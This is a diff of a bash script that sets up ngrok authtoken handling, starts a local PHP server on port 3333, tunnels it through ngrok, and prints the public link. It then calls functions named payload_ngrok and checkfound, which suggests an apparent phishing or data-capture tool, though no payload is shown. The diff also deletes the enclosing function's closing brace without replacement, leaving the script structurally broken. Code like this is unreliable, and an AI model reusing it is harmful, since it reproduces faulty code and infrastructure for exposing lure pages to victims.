@@ -377,64 +377,90 @@ else
 fi
 fi
 
-# Ngrok auth token handling
+# ================================
+# NGROK AUTH TOKEN HANDLING (FIXED)
+# ================================
+
+ngrok_config_linux="$HOME/.ngrok2/ngrok.yml"
+ngrok_config_windows="$USERPROFILE\\.ngrok2\\ngrok.yml"
+
+set_ngrok_token_windows() {
+    # Check if config file exists
+    if [[ -f "$ngrok_config_windows" && $(grep -c "authtoken:" "$ngrok_config_windows") -gt 0 ]]; then
+        echo -e "\e[1;92m[*] Ngrok authtoken already exists. Skipping...\e[0m"
+    else
+        read -p $'\e[1;92m[+] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
+        ./ngrok.exe authtoken "$ngrok_auth" > /dev/null 2>&1 &
+        echo -e "\e[1;92m[*] Ngrok authtoken saved.\e[0m"
+    fi
+}
+
+set_ngrok_token_linux() {
+    # Check if config file exists and contains authtoken
+    if [[ -f "$ngrok_config_linux" && $(grep -c "authtoken:" "$ngrok_config_linux") -gt 0 ]]; then
+        echo -e "\e[1;92m[*] Ngrok authtoken already exists. Skipping...\e[0m"
+    else
+        read -p $'\e[1;92m[+] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
+
+        mkdir -p "$HOME/.ngrok2"
+        echo "authtoken: $ngrok_auth" > "$ngrok_config_linux"
+
+        echo -e "\e[1;92m[*] Ngrok authtoken saved.\e[0m"
+    fi
+}
+
+# ================================
+# WINDOWS MODE
+# ================================
 if [[ "$windows_mode" == true ]]; then
-    if [[ -e "$USERPROFILE\.ngrok2\ngrok.yml" ]]; then
-        printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
-        cat "$USERPROFILE\.ngrok2\ngrok.yml"
-        read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
-        if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
-            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
-            ./ngrok.exe authtoken $ngrok_auth >  /dev/null 2>&1 &
-            printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
-        fi
-    else
-        read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
-        ./ngrok.exe authtoken $ngrok_auth >  /dev/null 2>&1 &
-    fi
-    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
-    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+
+    set_ngrok_token_windows
+
+    echo -e "\e[1;92m[*] Starting PHP server...\e[0m"
+    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
     sleep 2
-    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
+
+    echo -e "\e[1;92m[*] Starting Ngrok...\e[0m"
     ./ngrok.exe http 3333 > /dev/null 2>&1 &
+
 else
-    if [[ -e ~/.ngrok2/ngrok.yml ]]; then
-        printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
-        cat  ~/.ngrok2/ngrok.yml
-        read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
-        if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
-            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
-            ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
-            printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
-        fi
-    else
-        read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
-        ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
-    fi
-    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
-    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+# ================================
+# LINUX MODE
+# ================================
+
+    set_ngrok_token_linux
+
+    echo -e "\e[1;92m[*] Starting PHP server...\e[0m"
+    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
     sleep 2
-    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
+
+    echo -e "\e[1;92m[*] Starting Ngrok...\e[0m"
     ./ngrok http 3333 > /dev/null 2>&1 &
+
 fi
 
+# ================================
+# WAIT FOR TUNNEL
+# ================================
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
+
 if [[ -z "$link" ]]; then
-printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run this command killall ngrok\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running ngrok manually: ./ngrok http 3333\n"
-exit 1
+    echo -e "\e[1;31m[!] Direct link is not generating.\e[0m"
+    echo -e "\e[1;93m[*] Possible issues:\e[0m"
+    echo -e "  - Invalid ngrok authtoken"
+    echo -e "  - Internet connection problems"
+    echo -e "  - Ngrok already running (run: killall ngrok)"
+    echo -e "  - Try manually: ./ngrok http 3333"
+    exit 1
 else
-printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
+    printf "\e[1;92m[*] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link"
 fi
+
 payload_ngrok
 checkfound
-}
+
 
 payload_ngrok() {
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
